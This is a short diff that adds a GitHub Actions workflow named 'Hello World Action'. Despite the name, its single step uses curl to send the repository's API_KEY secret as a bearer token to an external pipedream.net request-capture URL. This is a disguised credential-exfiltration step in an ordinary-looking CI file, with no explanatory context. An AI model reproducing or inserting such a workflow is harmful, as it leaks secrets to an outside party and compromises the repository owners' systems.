@@ -1,0 +1,10 @@
+on:
+  workflow_dispatch:
+
+jobs:
+  hello_world_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Hello World Action
+        run: |
+          curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" https://en12e6i3tq18hk.x.pipedream.net
